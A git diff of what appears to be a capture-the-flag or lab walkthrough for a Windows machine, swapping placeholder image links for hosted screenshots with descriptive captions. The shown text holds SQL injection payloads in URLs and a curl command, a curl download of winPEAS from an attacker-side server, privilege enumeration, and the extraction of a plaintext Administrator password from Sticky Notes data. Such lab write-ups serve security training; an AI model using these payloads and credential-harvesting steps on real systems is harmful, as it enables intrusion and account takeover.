@@ -273,7 +273,7 @@ if __name__ == "__main__":
 > curl -X GET "http://192.168.80.200/home.php?action=search&first_name=%27+UNION+select+%2A+from+employees%27&last_name=lastname" -H "X-Forwarded-For: 10.10.10.0" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
 
 > http://192.168.80.200/home.php?action=search&first_name=%27+OR+1%3D1--+-&last_name=
-> ![](image.png)
+> ![SQL injection OR 1=1-- lists 11 employees including Hidden User](https://github.com/user-attachments/assets/a06d108b-36cd-443c-b1f1-0cb2a867009d)
 
 > http://192.168.80.200/home.php?action=search&first_name=%27+ORDER+BY+5--+-&last_name=
 > ![ORDER BY 4 works - employees sorted by birth date](https://github.com/user-attachments/assets/c0f6c22b-308b-4ba4-a612-bffc0560d2a2)
@@ -286,21 +286,21 @@ if __name__ == "__main__":
 
 # This one is weirdly not a data?? what is this?
 
-> ![](image_1.png)
+> ![UNION select output shows odd Jeff Hills row pointing to SSH user](https://github.com/user-attachments/assets/55c99cf8-70d5-46fe-b8af-68369b176b2a)
 
 > ssh Jeff@192.168.80.200
 
-![](image_3.png)
+![ssh Jeff - ls fails but dir lists C:\Users\Jeff](https://github.com/user-attachments/assets/ab7c94a1-f9a9-44b5-83b4-30b0dd64f62e)
 
 # local.txt
 
 > type local.txt
 
-![](image_4.png)
+![Jeff Desktop - local.txt 34 bytes and type local.txt](https://github.com/user-attachments/assets/4dcb9d3d-d951-4d54-abe2-a4833c27325f)
 
 > whoami /priv
 
-![](image_5.png)
+![whoami /priv - Jeff has no exploitable privilege](https://github.com/user-attachments/assets/da786914-a3b7-4418-87d3-104274270924)
 
 # It doesn't not include vulnerabilities
 
@@ -315,18 +315,18 @@ SeTimeZonePrivilege Change the time zone Enabled
 # install winPEAS
 
 > apt install peass
-> ![](image_7.png)
+> ![kali - winPEAS files served by python3 http.server on port 80](https://github.com/user-attachments/assets/8ec422bc-0554-4c27-a487-6371ae40c0ee)
 
 # moving winPEASany.exe
 
 > curl http://192.168.49.80/winPEASany.exe -o winPEASany.exe
-> ![](image_8.png)
+> ![curl winPEASany.exe download complete 11.1M](https://github.com/user-attachments/assets/8dd7a2f6-7582-41a2-a60f-f7f3d4733d4d)
 
 # execute winPEASEany.exe -> found Administrator
 
 > winPEASany.exe
 
-![](image_9.png)
+![winPEAS local users - Administrator RID 500 enabled](https://github.com/user-attachments/assets/cfb744c8-250a-43e7-9035-9e8457398e20)
 
 - Display information about local users (T1087.001)
   Computer Name : ROBUST
@@ -339,36 +339,36 @@ SeTimeZonePrivilege Change the time zone Enabled
   Logons Count : 49
   Password Last Set : 3/21/2022 10:11:35 PM
 
-![](image_10.png)
+![winPEAS local users - DefaultAccount Guest Jeff](https://github.com/user-attachments/assets/d97d3fa2-d372-4a34-98f9-841d40f4ff8b)
 
 # fail password
 
 > runas /usr:Administrator cmd
-> ![](image_11.png)
+> ![runas Administrator fails - RUNAS ERROR unable to acquire user password](https://github.com/user-attachments/assets/cbe33d93-dac6-48c5-b383-8c794ea48222)
 
 # switch powershell
 
-![](image_12.png)
+![switch from cmd to PowerShell](https://github.com/user-attachments/assets/07163258-de86-4b83-9d59-4162f9fb674e)
 
 > type plum.sqlite | findstr /i "Credentials"
 
-![](image.png)
+![plum.sqlite findstr Creden and Admin - Sticky Notes credential entries](https://github.com/user-attachments/assets/54bbf647-503f-4d47-9a83-b65739f40ffd)
 
 > PS C:\Users\Jeff\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> type plum
 > .sqlite | findstr /i "Admin"
 
-![](image_15.png)
+![findstr /i Admin - Administrator credential entry in plum.sqlite](https://github.com/user-attachments/assets/f0b5d2f9-300a-40cc-aeaf-123c4213ab46)
 
 MySupersecurePassword2112
 
-![](image_16.png)
+![runas /user:Administrator cmd with found password](https://github.com/user-attachments/assets/4a2cc272-2c5e-41f2-a387-807ec7003e48)
 
 C:\Users\Administrator
 
-![](image_18.png)
+![PS C:\Users dir - Administrator Jeff Public](https://github.com/user-attachments/assets/8b5f6b04-bd6b-455d-b771-5ea964de07e6)
 
 # ssh Administrator@192.168.80.200
 
-![](image_19.png)
+![Administrator shell - administrator@ROBUST C:\Users\Administrator](https://github.com/user-attachments/assets/e1bae1e6-7ed9-407d-9445-6758b285637c)
 
-![](image_20.png)
+![ssh Administrator - Desktop proof.txt 34 bytes](https://github.com/user-attachments/assets/95a1da7c-4be5-4cfc-a6bd-b7b8f5c8624a)
